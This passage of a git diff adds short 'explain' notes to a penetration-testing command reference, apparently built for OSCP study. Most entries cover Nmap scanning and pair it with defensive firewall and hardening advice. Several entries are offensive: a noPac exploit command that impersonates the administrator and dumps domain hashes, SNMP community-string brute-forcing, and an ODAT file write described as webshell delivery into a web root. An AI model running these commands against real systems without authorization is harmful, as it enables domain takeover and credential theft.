+      "explain": "Runs a specific NSE script against a target after installing it:\n  -sV                    version-detect the service first\n  -p <port>              the port to test\n  --script \"<script-name>\"   the NSE script to run\n  <ip>                   the target\nAfter copying a .nse into /usr/share/nmap/scripts and running --script-updatedb, this executes the check (add --script-args to pass parameters); --script vuln runs the whole vuln category."
     },
     {
       "type": "command",
@@ -53734,7 +53890,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Network perimeters that do not filter ICMP, do not use egress filtering, or expose unnecessary services (all ports open) allow comprehensive port scanning. Systems without host-based firewalls or IDS/IPS allow scan traffic to enumerate every open service, revealing attack surface. No rate-limiting on inbound probes means stealth scans complete quickly.",
         "vulnerable_config": "# No firewall between attacker and target (or overly permissive rules):\n# iptables -L  ->  Chain INPUT (policy ACCEPT)  [no rules]\n# Or: Windows Firewall disabled\n# Every service's port is reachable from any source\n\n# No IDS/IPS:\n# Snort/Suricata not deployed; no AWS GuardDuty / Azure Defender\n# Nmap SYN scan completes in seconds with no alert generated",
         "secure_config": "# Linux host-based firewall - default-deny inbound:\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -i lo -j ACCEPT\n# Only open required services:\niptables -A INPUT -p tcp --dport 443 -j ACCEPT  # HTTPS only\niptables -A INPUT -p tcp --dport 22 -s 10.10.1.0/24 -j ACCEPT  # SSH from mgmt network\n\n# Rate-limit scan detection (drops SYN floods):\niptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT\niptables -A INPUT -p tcp --syn -j DROP\n\n# Deploy IDS/IPS:\n# Snort/Suricata rules detect nmap OS detection probes\n# AWS: GuardDuty (detects port scans from EC2)\n# Cloud: Security Groups default-deny with explicit allow rules"
-      }
+      },
+      "explain": "Inventories every service on a host:\n  -p-   scan all 65535 TCP ports\n  -sV   probe each open port for its service and version\nGives the complete service/version list to match against known vulnerabilities; add --stats-every=5s or -v to track progress on long scans."
     },
     {
       "type": "command",
@@ -53847,7 +54004,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Network perimeters that do not filter ICMP, do not use egress filtering, or expose unnecessary services (all ports open) allow comprehensive port scanning. Systems without host-based firewalls or IDS/IPS allow scan traffic to enumerate every open service, revealing attack surface. No rate-limiting on inbound probes means stealth scans complete quickly.",
         "vulnerable_config": "# No firewall between attacker and target (or overly permissive rules):\n# iptables -L  ->  Chain INPUT (policy ACCEPT)  [no rules]\n# Or: Windows Firewall disabled\n# Every service's port is reachable from any source\n\n# No IDS/IPS:\n# Snort/Suricata not deployed; no AWS GuardDuty / Azure Defender\n# Nmap SYN scan completes in seconds with no alert generated",
         "secure_config": "# Linux host-based firewall - default-deny inbound:\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -i lo -j ACCEPT\n# Only open required services:\niptables -A INPUT -p tcp --dport 443 -j ACCEPT  # HTTPS only\niptables -A INPUT -p tcp --dport 22 -s 10.10.1.0/24 -j ACCEPT  # SSH from mgmt network\n\n# Rate-limit scan detection (drops SYN floods):\niptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT\niptables -A INPUT -p tcp --syn -j DROP\n\n# Deploy IDS/IPS:\n# Snort/Suricata rules detect nmap OS detection probes\n# AWS: GuardDuty (detects port scans from EC2)\n# Cloud: Security Groups default-deny with explicit allow rules"
-      }
+      },
+      "explain": "Ping-sweeps a range to list live hosts:\n  <cidr>   the network to sweep\n  -sn      host discovery only, no port scan\n  -oA tnet save all output formats\n  | grep for | cut -d\" \" -f5   pull just the live IPs out of the output\nProduces a clean live-host list to feed a follow-up service scan."
     },
     {
       "type": "command",
@@ -53952,7 +54110,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Network perimeters that do not filter ICMP, do not use egress filtering, or expose unnecessary services (all ports open) allow comprehensive port scanning. Systems without host-based firewalls or IDS/IPS allow scan traffic to enumerate every open service, revealing attack surface. No rate-limiting on inbound probes means stealth scans complete quickly.",
         "vulnerable_config": "# No firewall between attacker and target (or overly permissive rules):\n# iptables -L  ->  Chain INPUT (policy ACCEPT)  [no rules]\n# Or: Windows Firewall disabled\n# Every service's port is reachable from any source\n\n# No IDS/IPS:\n# Snort/Suricata not deployed; no AWS GuardDuty / Azure Defender\n# Nmap SYN scan completes in seconds with no alert generated",
         "secure_config": "# Linux host-based firewall - default-deny inbound:\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -i lo -j ACCEPT\n# Only open required services:\niptables -A INPUT -p tcp --dport 443 -j ACCEPT  # HTTPS only\niptables -A INPUT -p tcp --dport 22 -s 10.10.1.0/24 -j ACCEPT  # SSH from mgmt network\n\n# Rate-limit scan detection (drops SYN floods):\niptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT\niptables -A INPUT -p tcp --syn -j DROP\n\n# Deploy IDS/IPS:\n# Snort/Suricata rules detect nmap OS detection probes\n# AWS: GuardDuty (detects port scans from EC2)\n# Cloud: Security Groups default-deny with explicit allow rules"
-      }
+      },
+      "explain": "Tunes Nmap timing to speed up large scans:\n  <cidr> -F                     fast mode (top 100 ports) over the range\n  --initial-rtt-timeout 50ms    starting round-trip estimate\n  --max-rtt-timeout 100ms       cap per-probe wait\nLowers latency at the cost of missing hosts on lossy links; save outputs (-oN) with and without tuning and diff the open-port counts to judge the trade-off (--min-rate raises packet rate)."
     },
     {
       "type": "command",
@@ -54071,7 +54230,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Network perimeters that do not filter ICMP, do not use egress filtering, or expose unnecessary services (all ports open) allow comprehensive port scanning. Systems without host-based firewalls or IDS/IPS allow scan traffic to enumerate every open service, revealing attack surface. No rate-limiting on inbound probes means stealth scans complete quickly.",
         "vulnerable_config": "# No firewall between attacker and target (or overly permissive rules):\n# iptables -L  ->  Chain INPUT (policy ACCEPT)  [no rules]\n# Or: Windows Firewall disabled\n# Every service's port is reachable from any source\n\n# No IDS/IPS:\n# Snort/Suricata not deployed; no AWS GuardDuty / Azure Defender\n# Nmap SYN scan completes in seconds with no alert generated",
         "secure_config": "# Linux host-based firewall - default-deny inbound:\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -i lo -j ACCEPT\n# Only open required services:\niptables -A INPUT -p tcp --dport 443 -j ACCEPT  # HTTPS only\niptables -A INPUT -p tcp --dport 22 -s 10.10.1.0/24 -j ACCEPT  # SSH from mgmt network\n\n# Rate-limit scan detection (drops SYN floods):\niptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT\niptables -A INPUT -p tcp --syn -j DROP\n\n# Deploy IDS/IPS:\n# Snort/Suricata rules detect nmap OS detection probes\n# AWS: GuardDuty (detects port scans from EC2)\n# Cloud: Security Groups default-deny with explicit allow rules"
-      }
+      },
+      "explain": "Saves scan results in every format at once:\n  -p-           scan all ports\n  -oA target    write target.nmap (normal), .gnmap (grepable), and .xml together\nGives you grep-friendly and machine-readable copies from one run; convert the XML to an HTML report with 'xsltproc target.xml -o target.html'."
     },
     {
       "id": "ad-nmap-host-list",
@@ -54163,7 +54323,8 @@ const COMMAND_DATA = {
           "label": "DC-focused ports only",
           "command": "nmap -p 53,88,135,139,389,445,464,636,3268,3269 -sV <dc_ip>"
         }
-      ]
+      ],
+      "explain": "Runs a full nmap scan against a discovered host list:\n  sudo nmap -v   verbose\n  -A            OS detection, version detection, default scripts, and traceroute\n  -iL <hostfile>   read targets from the fping output file\n  -oN <outfile>    save normal-format results\nProfiles services across all live hosts so you can pick attack surface; narrow with -p and --open for a faster targeted sweep."
     },
     {
       "type": "command",
@@ -54295,7 +54456,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Common introductory misconfigurations: services running as root/SYSTEM unnecessarily, default credentials unchanged, unnecessary services listening on all interfaces, lack of firewall rules exposing services externally, no monitoring or alerting on authentication failures.",
         "vulnerable_config": "# Service listening on all interfaces with default creds (common in labs/staging):\nss -tlnp | grep LISTEN\n# 0.0.0.0:21  (FTP on all interfaces)\n# 0.0.0.0:3306 (MySQL on all interfaces - should be 127.0.0.1 only)\n# 0.0.0.0:8080 (Tomcat with manager app accessible)\n\n# Running services as root:\nps aux | grep -E '(mysql|apache|nginx|ftp)'\n# root  1234  /usr/sbin/mysqld  <-- should run as 'mysql' user",
         "secure_config": "# Bind services to localhost or specific IPs (not 0.0.0.0):\n# MySQL: my.cnf -> bind-address = 127.0.0.1\n# Apache: Listen 127.0.0.1:80 (if behind a proxy)\n\n# Run services as dedicated low-priv users:\n# systemd unit: User=mysql Group=mysql\n\n# Host-based firewall (ufw):\nufw default deny incoming\nufw allow from 10.10.1.0/24 to any port 22  # SSH from mgmt only\nufw allow 443  # HTTPS\nufw enable\n\n# Change all default credentials immediately after installation\n# Enable fail2ban for SSH and web services"
-      }
+      },
+      "explain": "Runs the standard thorough nmap enumeration scan:\n  nmap   the scanner\n  -sV    version-detect each service\n  -sC    run the default safe NSE scripts\n  -p-    scan all 65535 TCP ports\n  <ip>   the target\nGives ports, service versions, and script findings in one pass; follow up with targeted per-service NSE scripts (e.g. --script smb-os-discovery -p445) once you see what is open."
     },
     {
       "type": "command",
@@ -54389,7 +54551,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Network perimeters that do not filter ICMP, do not use egress filtering, or expose unnecessary services (all ports open) allow comprehensive port scanning. Systems without host-based firewalls or IDS/IPS allow scan traffic to enumerate every open service, revealing attack surface. No rate-limiting on inbound probes means stealth scans complete quickly.",
         "vulnerable_config": "# No firewall between attacker and target (or overly permissive rules):\n# iptables -L  ->  Chain INPUT (policy ACCEPT)  [no rules]\n# Or: Windows Firewall disabled\n# Every service's port is reachable from any source\n\n# No IDS/IPS:\n# Snort/Suricata not deployed; no AWS GuardDuty / Azure Defender\n# Nmap SYN scan completes in seconds with no alert generated",
         "secure_config": "# Linux host-based firewall - default-deny inbound:\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -i lo -j ACCEPT\n# Only open required services:\niptables -A INPUT -p tcp --dport 443 -j ACCEPT  # HTTPS only\niptables -A INPUT -p tcp --dport 22 -s 10.10.1.0/24 -j ACCEPT  # SSH from mgmt network\n\n# Rate-limit scan detection (drops SYN floods):\niptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT\niptables -A INPUT -p tcp --syn -j DROP\n\n# Deploy IDS/IPS:\n# Snort/Suricata rules detect nmap OS detection probes\n# AWS: GuardDuty (detects port scans from EC2)\n# Cloud: Security Groups default-deny with explicit allow rules"
-      }
+      },
+      "explain": "Checks whether a single host is alive:\n  -sn                 no port scan (ping only)\n  -oA host            save all output formats\n  -PE                 use an ICMP echo request as the probe\n  --packet-trace      show every probe/response\nConfirms liveness and shows exactly what replied; add --disable-arp-ping so Nmap uses your ICMP probe instead of short-circuiting via ARP on the local segment."
     },
     {
       "type": "command",
@@ -54481,7 +54644,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Network perimeters that do not filter ICMP, do not use egress filtering, or expose unnecessary services (all ports open) allow comprehensive port scanning. Systems without host-based firewalls or IDS/IPS allow scan traffic to enumerate every open service, revealing attack surface. No rate-limiting on inbound probes means stealth scans complete quickly.",
         "vulnerable_config": "# No firewall between attacker and target (or overly permissive rules):\n# iptables -L  ->  Chain INPUT (policy ACCEPT)  [no rules]\n# Or: Windows Firewall disabled\n# Every service's port is reachable from any source\n\n# No IDS/IPS:\n# Snort/Suricata not deployed; no AWS GuardDuty / Azure Defender\n# Nmap SYN scan completes in seconds with no alert generated",
         "secure_config": "# Linux host-based firewall - default-deny inbound:\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -i lo -j ACCEPT\n# Only open required services:\niptables -A INPUT -p tcp --dport 443 -j ACCEPT  # HTTPS only\niptables -A INPUT -p tcp --dport 22 -s 10.10.1.0/24 -j ACCEPT  # SSH from mgmt network\n\n# Rate-limit scan detection (drops SYN floods):\niptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT\niptables -A INPUT -p tcp --syn -j DROP\n\n# Deploy IDS/IPS:\n# Snort/Suricata rules detect nmap OS detection probes\n# AWS: GuardDuty (detects port scans from EC2)\n# Cloud: Security Groups default-deny with explicit allow rules"
-      }
+      },
+      "explain": "The base Nmap invocation pattern:\n  nmap <scan_types> <options> <target>   scan type(s), flags, then what to scan\nThe default SYN scan (sudo nmap -sS <target>) needs root and is the standard first probe; 'nmap --help' lists the options."
     },
     {
       "type": "command",
@@ -54588,7 +54752,8 @@ const COMMAND_DATA = {
           "label": "Packet-trace on a single port (diagnose closed/filtered state)",
           "command": "sudo nmap <ip> -p 21 --packet-trace -Pn -n --disable-arp-ping"
         }
-      ]
+      ],
+      "explain": "Completes the full TCP handshake to determine port state:\n  -sT     TCP connect scan (works without root and through proxies)\n  -p 443  the port\n  -Pn -n --disable-arp-ping   no discovery/DNS/ARP\n  --packet-trace              show the packets\n  --reason                    print why Nmap calls a port open/closed/filtered\nUse -sT when you cannot send raw packets (unprivileged, or over a SOCKS proxy)."
     },
     {
       "type": "command",
@@ -54688,7 +54853,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Network perimeters that do not filter ICMP, do not use egress filtering, or expose unnecessary services (all ports open) allow comprehensive port scanning. Systems without host-based firewalls or IDS/IPS allow scan traffic to enumerate every open service, revealing attack surface. No rate-limiting on inbound probes means stealth scans complete quickly.",
         "vulnerable_config": "# No firewall between attacker and target (or overly permissive rules):\n# iptables -L  ->  Chain INPUT (policy ACCEPT)  [no rules]\n# Or: Windows Firewall disabled\n# Every service's port is reachable from any source\n\n# No IDS/IPS:\n# Snort/Suricata not deployed; no AWS GuardDuty / Azure Defender\n# Nmap SYN scan completes in seconds with no alert generated",
         "secure_config": "# Linux host-based firewall - default-deny inbound:\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -i lo -j ACCEPT\n# Only open required services:\niptables -A INPUT -p tcp --dport 443 -j ACCEPT  # HTTPS only\niptables -A INPUT -p tcp --dport 22 -s 10.10.1.0/24 -j ACCEPT  # SSH from mgmt network\n\n# Rate-limit scan detection (drops SYN floods):\niptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT\niptables -A INPUT -p tcp --syn -j DROP\n\n# Deploy IDS/IPS:\n# Snort/Suricata rules detect nmap OS detection probes\n# AWS: GuardDuty (detects port scans from EC2)\n# Cloud: Security Groups default-deny with explicit allow rules"
-      }
+      },
+      "explain": "Scans the most common ports to trade coverage for speed:\n  --top-ports=10   scan the 10 statistically most common ports\nPort selection is the main scope lever; give -p 21 for a single port or -p- for everything when you need full coverage."
     },
     {
       "type": "command",
@@ -54792,7 +54958,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Network perimeters that do not filter ICMP, do not use egress filtering, or expose unnecessary services (all ports open) allow comprehensive port scanning. Systems without host-based firewalls or IDS/IPS allow scan traffic to enumerate every open service, revealing attack surface. No rate-limiting on inbound probes means stealth scans complete quickly.",
         "vulnerable_config": "# No firewall between attacker and target (or overly permissive rules):\n# iptables -L  ->  Chain INPUT (policy ACCEPT)  [no rules]\n# Or: Windows Firewall disabled\n# Every service's port is reachable from any source\n\n# No IDS/IPS:\n# Snort/Suricata not deployed; no AWS GuardDuty / Azure Defender\n# Nmap SYN scan completes in seconds with no alert generated",
         "secure_config": "# Linux host-based firewall - default-deny inbound:\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -i lo -j ACCEPT\n# Only open required services:\niptables -A INPUT -p tcp --dport 443 -j ACCEPT  # HTTPS only\niptables -A INPUT -p tcp --dport 22 -s 10.10.1.0/24 -j ACCEPT  # SSH from mgmt network\n\n# Rate-limit scan detection (drops SYN floods):\niptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT\niptables -A INPUT -p tcp --syn -j DROP\n\n# Deploy IDS/IPS:\n# Snort/Suricata rules detect nmap OS detection probes\n# AWS: GuardDuty (detects port scans from EC2)\n# Cloud: Security Groups default-deny with explicit allow rules"
-      }
+      },
+      "explain": "Scans UDP services:\n  -F    fast mode (top 100 ports)\n  -sU   UDP scan\nUDP is slow and ambiguous: closed ports reply ICMP port-unreachable while open ports stay silent, so many show open|filtered; add --reason to see why each port got its verdict."
     },
     {
       "type": "command",
@@ -54882,7 +55049,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Network perimeters that do not filter ICMP, do not use egress filtering, or expose unnecessary services (all ports open) allow comprehensive port scanning. Systems without host-based firewalls or IDS/IPS allow scan traffic to enumerate every open service, revealing attack surface. No rate-limiting on inbound probes means stealth scans complete quickly.",
         "vulnerable_config": "# No firewall between attacker and target (or overly permissive rules):\n# iptables -L  ->  Chain INPUT (policy ACCEPT)  [no rules]\n# Or: Windows Firewall disabled\n# Every service's port is reachable from any source\n\n# No IDS/IPS:\n# Snort/Suricata not deployed; no AWS GuardDuty / Azure Defender\n# Nmap SYN scan completes in seconds with no alert generated",
         "secure_config": "# Linux host-based firewall - default-deny inbound:\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -i lo -j ACCEPT\n# Only open required services:\niptables -A INPUT -p tcp --dport 443 -j ACCEPT  # HTTPS only\niptables -A INPUT -p tcp --dport 22 -s 10.10.1.0/24 -j ACCEPT  # SSH from mgmt network\n\n# Rate-limit scan detection (drops SYN floods):\niptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT\niptables -A INPUT -p tcp --syn -j DROP\n\n# Deploy IDS/IPS:\n# Snort/Suricata rules detect nmap OS detection probes\n# AWS: GuardDuty (detects port scans from EC2)\n# Cloud: Security Groups default-deny with explicit allow rules"
-      }
+      },
+      "explain": "Fingerprints the exact service on one port:\n  -Pn -n --disable-arp-ping   no discovery/DNS/ARP\n  --packet-trace              show the probes\n  -p 445 --reason             the port, with the state reason\n  -sV                         version detection\nThe exact product/version is the pivot from an open port to a known-vulnerability lookup."
     },
     {
       "id": "nmap-vuln-scripts",
@@ -54984,7 +55152,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Network perimeters that do not filter ICMP, do not use egress filtering, or expose unnecessary services (all ports open) allow comprehensive port scanning. Systems without host-based firewalls or IDS/IPS allow scan traffic to enumerate every open service, revealing attack surface. No rate-limiting on inbound probes means stealth scans complete quickly.",
         "vulnerable_config": "# No firewall between attacker and target (or overly permissive rules):\n# iptables -L  ->  Chain INPUT (policy ACCEPT)  [no rules]\n# Or: Windows Firewall disabled\n# Every service's port is reachable from any source\n\n# No IDS/IPS:\n# Snort/Suricata not deployed; no AWS GuardDuty / Azure Defender\n# Nmap SYN scan completes in seconds with no alert generated",
         "secure_config": "# Linux host-based firewall - default-deny inbound:\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -i lo -j ACCEPT\n# Only open required services:\niptables -A INPUT -p tcp --dport 443 -j ACCEPT  # HTTPS only\niptables -A INPUT -p tcp --dport 22 -s 10.10.1.0/24 -j ACCEPT  # SSH from mgmt network\n\n# Rate-limit scan detection (drops SYN floods):\niptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT\niptables -A INPUT -p tcp --syn -j DROP\n\n# Deploy IDS/IPS:\n# Snort/Suricata rules detect nmap OS detection probes\n# AWS: GuardDuty (detects port scans from EC2)\n# Cloud: Security Groups default-deny with explicit allow rules"
-      }
+      },
+      "explain": "Runs Nmap's built-in vulnerability checks (exam-legal, unlike Nessus):\n  -sV               version-detect first (many vuln scripts key off it)\n  -p <port>         the port to test\n  --script vuln     run every NSE script in the 'vuln' category\n  <ip>              target\nFlags known CVEs on detected services; drop a downloaded CVE .nse into /usr/share/nmap/scripts, run --script-updatedb, then call it by name for a specific check."
     },
     {
       "type": "command",
@@ -55090,7 +55259,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Network perimeters that do not filter ICMP, do not use egress filtering, or expose unnecessary services (all ports open) allow comprehensive port scanning. Systems without host-based firewalls or IDS/IPS allow scan traffic to enumerate every open service, revealing attack surface. No rate-limiting on inbound probes means stealth scans complete quickly.",
         "vulnerable_config": "# No firewall between attacker and target (or overly permissive rules):\n# iptables -L  ->  Chain INPUT (policy ACCEPT)  [no rules]\n# Or: Windows Firewall disabled\n# Every service's port is reachable from any source\n\n# No IDS/IPS:\n# Snort/Suricata not deployed; no AWS GuardDuty / Azure Defender\n# Nmap SYN scan completes in seconds with no alert generated",
         "secure_config": "# Linux host-based firewall - default-deny inbound:\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -i lo -j ACCEPT\n# Only open required services:\niptables -A INPUT -p tcp --dport 443 -j ACCEPT  # HTTPS only\niptables -A INPUT -p tcp --dport 22 -s 10.10.1.0/24 -j ACCEPT  # SSH from mgmt network\n\n# Rate-limit scan detection (drops SYN floods):\niptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT\niptables -A INPUT -p tcp --syn -j DROP\n\n# Deploy IDS/IPS:\n# Snort/Suricata rules detect nmap OS detection probes\n# AWS: GuardDuty (detects port scans from EC2)\n# Cloud: Security Groups default-deny with explicit allow rules"
-      }
+      },
+      "explain": "Runs Nmap Scripting Engine checks for deeper enumeration:\n  -sC   run the default script category\nNSE Lua scripts do version-specific enumeration and vuln checks; target categories (--script <category>) or named scripts (--script banner,smtp-commands), and -A bundles -sC -sV -O --traceroute."
     },
     {
       "id": "ad-nopac-exploit",
@@ -55286,7 +55456,8 @@ const COMMAND_DATA = {
           "label": "Exploit -> dump hashes",
           "command": "python3 noPac.py <domain>/<user>:<password> -dc-ip <dc_ip> -dc-host <dc_hostname> --impersonate administrator -dump"
         }
-      ]
+      ],
+      "explain": "Checks whether a domain is vulnerable to NoPac (CVE-2021-42278 + CVE-2021-42287) with only LDAP queries:\n  scanner.py <domain>/<user>:<password>   authenticate as any domain user\n  -dc-ip <dc_ip>   the Domain Controller to test\n  -use-ldap        query over LDAP (quiet - no exploitation)\nPrints the domain SID and confirms if the DC can be impersonated; run it before noPac.py so you only fire the exploit against a confirmed-vulnerable DC."
     },
     {
       "id": "cdsa-m07-nta-workflow",
@@ -55853,7 +56024,8 @@ const COMMAND_DATA = {
           "OSCP Ch06",
           "MITRE T1110.003"
         ]
-      }
+      },
+      "explain": "Brute-forces SNMP community strings quickly over UDP:\n  onesixtyone   the scanner\n  -c <community_wordlist>   list of community strings to try\n  <ip>          the target (or -i <file> for many)\nFinds the valid community string that unlocks snmpwalk; it is fast enough to sweep a whole /24."
     },
     {
       "id": "openssl-gzip-crack",
@@ -56039,7 +56211,8 @@ const COMMAND_DATA = {
           "command": "# Greenbone UI: Reports → select report → Export → XML format",
           "label": "Greenbone UI: Reports → select rep…"
         }
-      ]
+      ],
+      "explain": "Converts an exported OpenVAS XML report into a formatted deliverable:\n  python3 -m openvasreporting   run the reporting module\n  -i <report>.xml               the report exported from Greenbone\n  -f xlsx                       output format (Excel workbook)\nProduces a triage-friendly spreadsheet; use -f docx for a Word document and --min-lvl high to include only high/critical findings."
     },
     {
       "type": "command",
@@ -56172,7 +56345,8 @@ const COMMAND_DATA = {
           "command": "sudo gvm-stop",
           "label": "gvm-stop"
         }
-      ]
+      ],
+      "explain": "Initializes Greenbone Vulnerability Management (OpenVAS) after install:\n  sudo gvm-setup   create the databases, feeds, and admin user\nOnce 'sudo gvm-start' is running, log into the Greenbone Security Assistant at https://127.0.0.1:9392 with the credentials gvm-setup prints; 'gvm-check-setup' verifies the install."
     },
     {
       "type": "command",
@@ -56285,7 +56459,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# IPMI cipher 0 - no authentication required:\n# ipmitool -H <ip> -U admin -P '' -I lanplus -C 0 chassis status\n# Returns valid data - auth bypassed entirely\n\n# rsync anonymous access:\n# rsync --list-only rsync://<ip>/  # lists all modules without auth\n# rsync rsync://<ip>/backup /tmp   # downloads backup files\n\n# Oracle TNS - version banner reveals exact version:\n# nmap -p 1521 -sV -> Oracle Database 11.2.0.4 (exact version)",
         "secure_config": "# IPMI - disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync - require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec - disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS - disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)",
         "evasion": "Enumerate SIDs sparingly; use valid creds where possible; avoid brute loops that trip account lockout."
-      }
+      },
+      "explain": "Runs a full Oracle assessment with ODAT:\n  ./odat.py all   run every check module\n  -s <ip>         the Oracle server\nProbes the listener, brute-forces the SID, tests default creds, and reports privilege-escalation and file-access paths; scan 1521 with the oracle-sid-brute NSE script first, then log in with 'sqlplus user/pass@ip/SID'."
     },
     {
       "id": "oracle-tns-file-upload",
@@ -56407,7 +56582,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "-- UTL_FILE reachable by everyone + a wide-open directory:\nGRANT EXECUTE ON SYS.UTL_FILE TO PUBLIC;\n-- legacy parameter (init.ora):\nutl_file_dir = *\n-- or a DIRECTORY object pointing at the web root, writable by a low-priv account:\nCREATE DIRECTORY web AS '/var/www/html';\nGRANT READ, WRITE ON DIRECTORY web TO app_user;",
         "secure_config": "-- Remove broad UTL_FILE access:\nREVOKE EXECUTE ON SYS.UTL_FILE FROM PUBLIC;\n-- Drop the legacy wildcard; use scoped DIRECTORY objects instead of utl_file_dir:\nALTER SYSTEM RESET utl_file_dir SCOPE=SPFILE;\n-- Grant directory access only where required, least-privilege, never the web root:\nCREATE DIRECTORY data_load AS '/opt/oracle/import';\nGRANT READ ON DIRECTORY data_load TO app_user;   -- add WRITE only if truly needed\n-- Run Oracle as a low-privileged OS account; restrict the TNS listener (valid node checking / firewall); patch.",
         "code_review": "Not a web-source sink - this is a DATABASE privilege/config review. RED FLAGS (Oracle):\n  GRANT EXECUTE ON UTL_FILE TO PUBLIC (or to broad app roles)\n  utl_file_dir = *   (legacy init.ora/spfile parameter)\n  CREATE DIRECTORY ... AS '<web root or writable path>' + READ/WRITE granted to non-admins\n  application accounts holding the DBA / SYSDBA role\nCHECK:  SELECT grantee,privilege FROM dba_tab_privs WHERE table_name='UTL_FILE';   SELECT * FROM dba_directories;\nSAFE:   revoke EXECUTE on UTL_FILE from PUBLIC; no utl_file_dir wildcard; scoped DIRECTORY objects; app accounts are not sysdba."
-      }
+      },
+      "explain": "Writes a local file to the Oracle server's filesystem via UTL_FILE:\n  ./odat.py utlfile   the ODAT file-write module\n  -s <ip> -d <sid>    server and database SID\n  -U/-P --sysdba      credentials, connecting as SYSDBA\n  --putFile <remote_dir> <remote_filename> <file>   destination path/name and the local file\nDropping a file into the web root (e.g. C:\\inetpub\\wwwroot) gives a web-accessible file - a webshell delivery primitive; confirm with a curl GET."
     },
     {
       "type": "script",
@@ -56475,7 +56651,8 @@ const COMMAND_DATA = {
       "mitre": [
         "T1046"
       ],
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "explain": "One-time install of the tooling to attack Oracle TNS:\n  git clone https://github.com/quentinhardy/odat.git   fetch ODAT\nInstalls build deps and the Oracle client (cx_Oracle) that ODAT and sqlplus need; the card also includes the ld.so.conf fix for the common sqlplus shared-library load error."
     },
     {
       "id": "oscp-exam-methodology",
@@ -58247,7 +58424,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Stale user/computer accounts, excessive privileged group membership, misconfigured trusts, GPO weaknesses, missing LAPS deployment, disabled SMB signing, enabled Print Spooler on DCs.",
         "vulnerable_config": "# PingCastle healthcheck reveals common issues:\n# - Domain Admins group has 15 members (should be <5)\n# - 200 stale computer accounts (no logon in 90+ days)\n# - Forest trust with SID filtering disabled\n# - SMB signing not required on DCs",
         "secure_config": "# Address PingCastle findings:\n# 1. Reduce DA membership to minimum required\n# 2. Disable/remove stale accounts (Get-ADComputer -Filter {LastLogonDate -lt (Get-Date).AddDays(-90)})\n# 3. Enable SID filtering on all trusts\n# 4. Require SMB signing (GPO: Microsoft network server: Digitally sign communications (always) = Enabled)\n# 5. Run PingCastle quarterly to track improvement scores"
-      }
+      },
+      "explain": "Scores an AD environment's security posture:\n  PingCastle.exe --healthcheck   run the health-check assessment\nProduces a CMMI-scored report of misconfigurations and risky settings (delegation, weak trusts, stale accounts, privileged groups) - fast situational awareness for both attackers mapping weaknesses and defenders prioritizing fixes."
     },
     {
       "id": "ping-sweep",
@@ -58349,7 +58527,8 @@ const COMMAND_DATA = {
